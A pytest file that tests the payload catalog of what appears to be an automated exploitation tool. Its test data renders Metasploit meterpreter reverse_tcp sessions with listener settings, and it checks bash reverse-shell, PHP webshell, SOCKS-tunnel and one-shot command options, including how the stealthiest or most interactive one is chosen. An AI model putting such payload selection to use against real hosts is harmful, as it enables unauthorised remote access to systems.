"""Payload-catalog contracts: render real values, never a broken command."""
from __future__ import annotations

import pytest

from phantom.automation.exploit.payload_catalog import (
    best_payload,
    payload_options,
)


ARGS = dict(
    lhost="10.0.0.99", lport=4444, command="id",
    module="exploit/multi/http/example",
    target="10.0.0.5", user="operator",
    msf_payload="linux/x64/meterpreter/reverse_tcp",
)


def _commands(access="exec", platform="linux", mode="balanced", **kwargs):
    options = payload_options(access, platform, mode, **{**ARGS, **kwargs})
    return {o["id"]: o["command"] for o in options}


def test_rendered_commands_have_no_unresolved_placeholders():
    for platform in ("linux", "windows", "macos"):
        for command in _commands(platform=platform).values():
            assert "{" not in command
            assert "}" not in command


def test_msf_session_uses_target_and_payload():
    command = _commands()["msf_session"]
    assert "set RHOSTS 10.0.0.5" in command
    assert "set PAYLOAD linux/x64/meterpreter/reverse_tcp" in command
    assert "set LHOST 10.0.0.99" in command
    assert "set LPORT 4444" in command


def test_socks_tunnel_uses_target_not_empty_string():
    command = _commands()["socks_tunnel"]
    assert "operator@10.0.0.5" in command


def test_one_shot_matches_the_platform():
    linux = _commands(platform="linux")
    windows = _commands(platform="windows")
    assert "sh -c 'id'" in linux["one_shot_linux"]
    assert "one_shot_linux" not in windows
    assert "cmd.exe /c id" in windows["one_shot_windows"]


def test_missing_values_become_explicit_placeholders():
    options = payload_options("exec", "linux", "balanced", command="id")
    commands = {o["id"]: o["command"] for o in options}
    # No callback values supplied: the msf/tunnel option is not runnable and
    # is therefore not a candidate for best_payload.
    assert commands["msf_session"] == ""
    assert best_payload("exec", "linux", "balanced", command="id")["id"] != (
        "msf_session")


def test_stealth_prefers_the_quiet_one_shot():
    best = best_payload("exec", "linux", "stealth", **ARGS)
    assert best is not None
    assert best["id"] == "one_shot_linux"


def test_aggressive_prefers_an_interactive_shell():
    best = best_payload("exec", "linux", "aggressive", **ARGS)
    assert best is not None
    assert best["kind"] in ("reverse_shell", "msf_session")


def test_info_access_has_no_payloads():
    assert payload_options("info", "linux", "balanced", **ARGS) == []
    assert best_payload("info", "linux", "balanced", **ARGS) is None


def test_file_write_can_use_a_webshell_but_not_exec_only_payloads():
    ids = set(_commands(access="file_write"))
    assert "webshell_php" in ids
    assert "one_shot_linux" not in ids
    assert "reverse_shell_bash" not in ids


@pytest.mark.parametrize("access", ["auth", "file_read", "file_write",
                                    "exec", "shell", "control", "info"])
def test_every_rendered_option_is_complete_or_empty(access):
    for option in payload_options(access, "linux", "balanced", **ARGS):
        assert option["command"] or option["kind"] in (
            "tunnel", "msf_session", "webshell")
